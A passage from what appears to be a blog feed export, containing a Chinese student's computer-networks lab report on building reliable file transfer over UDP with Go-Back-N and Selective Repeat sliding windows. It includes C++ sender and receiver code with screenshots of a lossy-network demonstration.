src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210402066095_776_20221230152046860766_341_image-20221230151606540.png" alt="image-20221230151606540"><figcaption aria-hidden="true">image-20221230151606540</figcaption></figure><p>快速重传的正确性上面分析的过程中也已经验证。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.2-基于UDP服务设计可靠传输协议(流量控制)</title>
    <link href="/posts/39007/"/>
    <url>/posts/39007/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.2-基于udp服务设计可靠传输协议流量控制">计算机网络实验3.2-基于UDP服务设计可靠传输协议(流量控制)</h1><div class="note note-info">写在前面：这次由于突然发烧隔离（虽然不是阳，也是挺重的一次感冒）导致没能及时检查作业，比较可惜。也借此提醒自己：一定要注意身体。另外也得接受教训。如金哥所言，提高应急处突能力还是非常重要的。</div><h2 id="实验要求">实验要求</h2><p>在实验3-1的基础上，将停等机制改成基于滑动窗口的流量控制机制，采用固定窗口大小，支持累积确认，完成给定测试文件的传输。</p><ul><li>多个序列号；</li><li>发送缓冲区、接受缓冲区；</li><li>滑动窗口：Go Back N；</li><li>有必要日志输出（须显示传输过程中发送端、接收端的窗口具体情况）。</li></ul><h2 id="程序流程展示">程序流程展示</h2><p>注：与实验3.1相同的部分仅作简要叙述，详细可以参见<a href="https://lunaticsky-tql.github.io/posts/24837/">计算机网络实验实验3.1</a></p><h3 id="协议设计">协议设计</h3><p>基于rdt3.0,本次实验实现了GBN和SR两种流水线协议，并采用多线程编程。</p><h4 id="报文结构">报文结构</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210446856605_235_20221210213512464145_894_image-20221210213415264.png" alt="image-20221210213415264"><figcaption aria-hidden="true">image-20221210213415264</figcaption></figure><p>如图所示，报文头长度共<code>128Bits</code>。下面介绍报文结构如下所示：</p><p>整个实验只使用一个序列号字段。对于发送端对应<code>TCP</code>中的<code>seq</code>,接收端对应<code>TCP</code>中的<code>ack</code>。</p><p>下面是十六位校验和以及数据报字段长度，与<code>TCP</code>相同。</p><p>使用<code>u_short</code>来存放<code>flag</code>。其字段含义如下：</p><p><code>F</code>:<code>FIN</code></p><p><code>S</code>:<code>SYN</code></p><p><code>A</code>:<code>ACK</code></p><p><code>H</code>:<code>FILE_HEAD</code></p><p><code>FILE_HEAD</code>用于指示接收端此报文包含文件信息的字段。</p><p><code>window_size</code>存放接收端通告给发送端的窗口大小。</p><p><code>option</code>为可选字段，在本次实验中暂时用于存放文件长度。</p><p><code>data</code>的最大长度可以调节，本次实验定义为1024字节。</p><p>此部分定义代码段如下;</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ad5ht1lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-ad5ht1lluwpkzv"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 1024</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA 0x0</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIN 0x1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYN 0x2</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK 0x4</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_SYN 0x6</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_FIN 0x5</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_HEAD 0x8</span><span class="hljs-comment">// datagram format:</span><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack(1)</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet_head</span> {    u_int seq;    u_short check_sum;    u_short data_size;    u_short flag;    u_short window_size;    u_int option;    <span class="hljs-built_in">packet_head</span>() {        seq = <span class="hljs-number">0</span>;        check_sum = <span class="hljs-number">0</span>;        data_size = <span class="hljs-number">0</span>;        flag = <span class="hljs-number">0</span>;        window_size = <span class="hljs-number">0</span>;        option = <span class="hljs-number">0</span>;    }};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet</span> {    packet_head head;    <span class="hljs-type">char</span> data[MAX_SIZE]{};    <span class="hljs-built_in">packet</span>() {        <span class="hljs-built_in">packet_head</span>();        <span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0</span>, MAX_SIZE);    }};<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack()</span></code></pre></div></div><p><code>#pragma pack(1)</code>用于指示结构体内容按1Byte对齐，以保证报文大小是我们期望的紧凑形式。</p><h4 id="建连和断连">建连和断连</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210448681529_442_20221210213259977349_103_image-20221119154308774.png" alt="image-20221119154308774"><figcaption aria-hidden="true">image-20221119154308774</figcaption></figure><p>建连和断连过程与3.1无太大变化。主要是在建连过程中增加了接收方初始窗口大小的通告。</p><h3 id="流程设计">流程设计</h3><p>程序支持一次建连发送多个文件。</p><p>本次实验与上次相比，整体逻辑没有变化，但序列号递增使用。在本次实验中序列号为<code>u_int</code>类型，可存储<span class="math inline">\(2^{32}\)</span>个序列号，每个数据包最大为<span class="math inline">\(1024\)</span>即<span class="math inline">\(2^{10}\)</span>字节，理论上最大可传输<span class="math inline">\(2^{42}=4TB\)</span>的单个文件。当然，由于在本实验中因为使用<code>option</code>字段存储文件长度，所以实际上能传输的最大长度是<span class="math inline">\(2^{32}\)</span>字节即即<span class="math inline">\(4GB\)</span>。总之，在不考虑可拓展性的前提下，不需循环使用序列号即可满足目前文件传输的需求。</p><h2 id="程序代码解释">程序代码解释</h2><h3 id="文件发送过程">文件发送过程</h3><h4 id="gbn">GBN</h4><p>下面先以基础的GBN为基础分析程序代码：</p><h5 id="发送端">发送端</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210450479476_331_20221210213515660596_123_image-20221210115848469.png" alt="image-20221210115848469"><figcaption aria-hidden="true">image-20221210115848469</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210451463902_386_20221210213517155143_340_image-20221210115903632.png" alt="image-20221210115903632"><figcaption aria-hidden="true">image-20221210115903632</figcaption></figure><p>课件中讲述也很直观，对照伪代码实现即可。</p><h6 id="发送进程主进程">发送进程（主进程）</h6><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zzg3bblluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-zzg3bblluwpkzv"><pre><code class="hljs c++"><span class="hljs-comment">//wasted space but saved time for "shifting" sndpkt window</span><span class="hljs-keyword">auto</span> *sndpkt = <span class="hljs-keyword">new</span> packet[pkt_total + <span class="hljs-number">1</span>];<span class="hljs-keyword">while</span> (base &lt; pkt_total) {    <span class="hljs-comment">//send packets</span>    <span class="hljs-keyword">if</span> (nextseqnum &lt; base + N &amp;&amp; nextseqnum &lt; pkt_total) {        pkt_data_size = <span class="hljs-built_in">min</span>(MAX_SIZE, file_len - nextseqnum * MAX_SIZE);        sndpkt[nextseqnum] = <span class="hljs-built_in">make_pkt</span>(DATA, nextseqnum, pkt_data_size, file_data + nextseqnum * MAX_SIZE);        <span class="hljs-built_in">udt_send</span>(sndpkt[nextseqnum]);        cout &lt;&lt; <span class="hljs-string">"Sent packet "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum) + <span class="hljs-string">" "</span>;        <span class="hljs-keyword">if</span> (base == nextseqnum) {            timer.<span class="hljs-built_in">start_timer</span>();        }        nextseqnum++;        <span class="hljs-built_in">print_window</span>();    }    <span class="hljs-comment">//handle timeout</span>    <span class="hljs-keyword">if</span> (timer.<span class="hljs-built_in">timeout</span>()) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout, resend packets from "</span> + <span class="hljs-built_in">to_string</span>(base) + <span class="hljs-string">" to "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum - <span class="hljs-number">1</span>),                      WARNING);        <span class="hljs-keyword">for</span> (u_int i = base; i &lt; nextseqnum; i++) {            <span class="hljs-built_in">udt_send</span>(sndpkt[i]);        }        timer.<span class="hljs-built_in">start_timer</span>();    }}</code></pre></div></div><p>这一部分逻辑与状态机中右上角两个部分完全一致。其中<code>timer</code>是一个全局的计时器，为自己编写的类。用法可以顾名思义。<code>print_window();</code>按照<code>[base|nexeseqnum|base+n]</code>的格式将当前窗口状态打印出来。</p><h6 id="接收进程">接收进程</h6><p>接收进程在发送之前创建。实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pnf3l6lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-pnf3l6lluwpkzv"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handle_ACK</span><span class="hljs-params">(LPVOID lpParam)</span> </span>{    packet rcvpkt;    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-comment">//non-blocking rdt_rcv (if not rcv any packet it, it will return 0)</span>        <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">rdt_rcv</span>(rcvpkt) || <span class="hljs-built_in">corrupt</span>(rcvpkt) || !<span class="hljs-built_in">isACK</span>(rcvpkt)) {            <span class="hljs-comment">//the packet must be ACK and not corrupt to jump out of the loop</span>        }<span class="hljs-comment">//        base = get_ack_num(rcvpkt) + 1;</span>        acked[<span class="hljs-built_in">get_ack_num</span>(rcvpkt)] = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }        cout &lt;&lt; <span class="hljs-string">"Received ACK "</span> + <span class="hljs-built_in">to_string</span>(<span class="hljs-built_in">get_ack_num</span>(rcvpkt)) + <span class="hljs-string">" "</span>;        <span class="hljs-built_in">print_window</span>();        <span class="hljs-keyword">if</span> (base == pkt_total) {            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        }        <span class="hljs-keyword">if</span> (base == nextseqnum) {            timer.<span class="hljs-built_in">stop_timer</span>();            <span class="hljs-keyword">continue</span>;        } <span class="hljs-keyword">else</span> {            timer.<span class="hljs-built_in">start_timer</span>();        }    }}</code></pre></div></div><p>这一部分助教思考的也非常深入：虽然实验环境下ACK不会丢失且能按序到达，但真实的网络环境下ACK也会丢失，且由于传输速度可能不一样快，ACK未必是按序到达的。这一点在上一次实验的握手建连部分考虑到了且有所叙述（接收方在确认握手成功后也有可能因为ACK丢失而收到发送方重发的握手包），但这一次实验囿于伪代码的惯性思维没有考虑周全，感谢助教提醒指正。</p><p>因此此处可参考后续SR的实现，移动时不能简单的移动到当前收到的序号+1，而是从base开始移动到按序收到的包序号之后，即：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5sygpplluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-5sygpplluwpkzv"><pre><code class="hljs c++"><span class="hljs-comment">//        base = get_ack_num(rcvpkt) + 1;</span>        acked[<span class="hljs-built_in">get_ack_num</span>(rcvpkt)] = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }</code></pre></div></div><p>当然这也需要把收到包的状态保存为数组。此处的空间复杂度还可以优化，也即实际上我们只需要窗口内的ACK状态即可，但这样就伴随着较为费时的“移动”。因此此处直接将所有状态都保存了下来。</p><h5 id="接收端">接收端</h5><p>接收端的变化主要一个是将窗口通告给发送方。这个任务只需要修改<code>make_pkt</code>即可，不再赘述。</p><p>另外一个是接收发送方数据的逻辑。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210452765370_923_20221210213518957536_859_image-20221210123705619.png" alt="image-20221210123705619"><figcaption aria-hidden="true">image-20221210123705619</figcaption></figure><p>代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-is2tnwlluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-is2tnwlluwpkzv"><pre><code class="hljs C++"><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">hasseqnum</span>(rcvpkt, expectedseqnum)) {            pkt_data_size = rcvpkt.head.data_size;            <span class="hljs-built_in">memcpy</span>(file_buffer + received_file_len, rcvpkt.data, pkt_data_size);            received_file_len += pkt_data_size;            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK,expectedseqnum);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(expectedseqnum), DEBUG);            expectedseqnum++;        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//discard the packet and wait for the next one</span>            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a out-of-order packet"</span>, WARNING);            <span class="hljs-keyword">continue</span>;        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a corrupt packet"</span>, DEBUG);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-keyword">if</span> (received_file_len == file_size) {        ...file received, writing file to the disk...    }}</code></pre></div></div><p>可以从状态机看到，我们只需要关注<code>expectedseqnum</code>对应的包即可，其他的包收到直接丢弃即可。这一部分并不复杂，对照状态机容易理解。</p><p>另外，在状态机中没有”失序重发ACK，确认按序正确接收的最高序号分组“对应的部分。事实上本次实验不重发ACK对正确性没有影响，但其对于拥塞控制来说是必须的。</p><h4 id="sr">SR</h4><p>在这次实验中也额外实现了SR选择重传流水线协议。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210454088467_865_20221210213520764848_548_image-20221210200312667.png" alt="image-20221210200312667"><figcaption aria-hidden="true">image-20221210200312667</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210455168753_804_20221210213542209437_469_image-20221210201321172.png" alt="image-20221210201321172"><figcaption aria-hidden="true">image-20221210201321172</figcaption></figure><h5 id="发送端-1">发送端</h5><p>发送端相比GBN，需要为每一个分组都加入定时器。一开始是希望每一个包发出后都创建一个相同进程用于监听ACK并处理超时事件，但实践中发现由于，传入的<code>packet</code>地址会在发送过程中被修改，在线程中无法正确每个线程获取需要等待的分组的序号和内容。因此转而采用线程池的方式进行实现，每个线程维护自己的定时器和需要重发的分组。代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-arcdrllluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-arcdrllluwpkzv"><pre><code class="hljs C++"><span class="hljs-comment">//wasted space but saved time for "shifting" sndpkt window</span><span class="hljs-type">clock_t</span> single_file_timer = <span class="hljs-built_in">clock</span>();<span class="hljs-keyword">while</span> (base &lt; pkt_total) {    <span class="hljs-comment">//send packets</span>    <span class="hljs-keyword">if</span> (nextseqnum &lt; base + N &amp;&amp; nextseqnum &lt; pkt_total) {        pkt_data_size = <span class="hljs-built_in">min</span>(MAX_SIZE, file_len - nextseqnum * MAX_SIZE);        sndpkt_buffer[nextseqnum] = <span class="hljs-built_in">make_pkt</span>(DATA, nextseqnum, pkt_data_size,                                             file_data + nextseqnum * MAX_SIZE);        <span class="hljs-built_in">udt_send</span>(sndpkt_buffer[nextseqnum]);        cout &lt;&lt; <span class="hljs-string">"Sent packet "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum) + <span class="hljs-string">" "</span>;        <span class="hljs-built_in">print_window</span>();        thread_pool[nextseqnum] = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, SR, &amp;sndpkt_buffer[nextseqnum], <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);        nextseqnum++;    }}</code></pre></div></div><p>其中<code>SR</code>线程的实现思路如下：</p><p><code>acked</code>数组中保存了当前分组确认的状态，和GBN中所叙述的类似。这个数组的内容由接收线程（与GBN相同，但只标记<code>acked</code>数组状态，不进行窗口滑动）进行修改。当第<code>wait_seq</code>个包对应的SR线程发现监听到了对应<code>acked</code>数组变化（即<code>接收ACK(n)</code>）判断是否进行窗口滑动。若超时，则重发对应的包，重启定时器。</p><p>下面是对应的代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mag7tzlluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-mag7tzlluwpkzv"><pre><code class="hljs C++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">SR</span><span class="hljs-params">(LPVOID lpParam)</span> </span>{    packet sndpkt = *<span class="hljs-built_in">reinterpret_cast</span>&lt;packet *&gt;(lpParam);    u_int wait_seq = sndpkt.head.seq;    <span class="hljs-type">int</span> resend_times = <span class="hljs-number">0</span>;    <span class="hljs-comment">//start a timer</span>    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();    <span class="hljs-keyword">while</span> (!acked[wait_seq]) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">timeout</span>(start)) {            <span class="hljs-built_in">udt_send</span>(sndpkt);            start = <span class="hljs-built_in">clock</span>();            <span class="hljs-keyword">if</span> (resend_times &gt; MAX_RESEND_TIMES) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Resend times exceed the limit, there must be something wrong with the network"</span>, ERR);                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;            } <span class="hljs-keyword">else</span> {                cout &lt;&lt; <span class="hljs-string">"Resend packet "</span> + <span class="hljs-built_in">to_string</span>(sndpkt.head.seq) + <span class="hljs-string">" "</span>;                <span class="hljs-built_in">print_window</span>();                resend_times++;            }        }    }    <span class="hljs-comment">//if reach here, the packet is ACKed</span>    <span class="hljs-keyword">if</span> (wait_seq == base) {        <span class="hljs-comment">//if the ACKed packet is the base, move the window to the first unACKed packet</span>        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><h5 id="接收端-1">接收端</h5><p>接收端比GBN的情况要复杂一些，因为需要缓存失序的包。实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fy2mv7lluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-fy2mv7lluwpkzv"><pre><code class="hljs C++"><span class="hljs-comment">//"blocking receive" here</span><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {        u_int pkt_seq = rcvpkt.head.seq;        <span class="hljs-keyword">if</span> (pkt_seq &gt;= rcv_base &amp;&amp; pkt_seq &lt; rcv_base + N) {            <span class="hljs-comment">//in the window</span>            <span class="hljs-keyword">if</span> (!acked[pkt_seq]) {                <span class="hljs-keyword">if</span> (pkt_seq == rcv_base) {                    <span class="hljs-comment">//the first packet in the window</span>                    pkt_data_size = rcvpkt.head.data_size;                    <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);                    acked[pkt_seq] = <span class="hljs-literal">true</span>;                    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base);                    <span class="hljs-built_in">udt_send</span>(sndpkt);                    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);                    <span class="hljs-comment">//slide the window</span>                    <span class="hljs-keyword">while</span> (acked[rcv_base]) {                        rcv_base++;                    }                } <span class="hljs-keyword">else</span> {                    <span class="hljs-comment">//not the first packet in the window, cache it</span>                    pkt_data_size = rcvpkt.head.data_size;                    <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);                    acked[pkt_seq] = <span class="hljs-literal">true</span>;                    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, pkt_seq);                    <span class="hljs-built_in">udt_send</span>(sndpkt);                    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq)+<span class="hljs-string">", cached"</span>, DEBUG);                }            } <span class="hljs-keyword">else</span> {                <span class="hljs-comment">//already acked in the window, resend the ack</span>                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" again"</span>, WARNING);                <span class="hljs-comment">//send ack</span>                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, pkt_seq);                <span class="hljs-built_in">udt_send</span>(sndpkt);                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent ack "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);            }        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((pkt_seq &gt;= rcv_base - N) &amp;&amp; (pkt_seq &lt; rcv_base)) {            <span class="hljs-comment">//out of the window, but in the buffer</span>            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" again"</span>, WARNING);            <span class="hljs-comment">//send ack</span>            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, pkt_seq);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent ack "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//out of the window and buffer</span>            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" out of the window"</span>, WARNING);            <span class="hljs-comment">//do nothing</span>        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a corrupt packet"</span>, DEBUG);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-keyword">if</span> (rcv_base * MAX_SIZE &gt;= file_size) {        ...file received, writing file to the disk...    }}</code></pre></div></div><p>虽然代码较长，但无非是区分了接收的分组在窗口内，窗口之前或者超出了缓冲区三种情况。</p><h2 id="程序演示">程序演示</h2><h3 id="建立连接">建立连接</h3><p>路由器设置：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210456392083_724_20221210213544187165_779_image-20221119185527966.png" alt="image-20221119185527966"><figcaption aria-hidden="true">image-20221119185527966</figcaption></figure><p>流程展示在上一次实验已经展示的比较完善。本次实验主要演示有丢包延时条件下的发送情况。</p><h3 id="gbn流水线协议">GBN流水线协议</h3><p>可以看到发送方当发现超时候会将<code>base</code>到<code>nextseqnum</code>之间的包全部重发。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210457628384_330_20221210213545630220_743_image-20221210212155885.png" alt="image-20221210212155885"><figcaption aria-hidden="true">image-20221210212155885</figcaption></figure><p>接收方也能判断失序的分组：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210458802437_390_20221210213547529597_432_image-20221210212321733.png" alt="image-20221210212321733"><figcaption aria-hidden="true">image-20221210212321733</figcaption></figure><h3 id="sr流水线协议">SR流水线协议</h3><p>在SN协议的实践中，发现发送方会经常由于超时重发接收方能够收到的包。猜测是由于接收方串行接收且接收的逻辑比发送方发送的逻辑复杂，导致了接收的速度跟不上发送的速度。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210500124097_756_20221210213549149283_237_image-20221210211645995.png" alt="image-20221210211645995"><figcaption aria-hidden="true">image-20221210211645995</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210501145708_569_20221210213550895116_592_image-20221210211627874.png" alt="image-20221210211627874"><figcaption 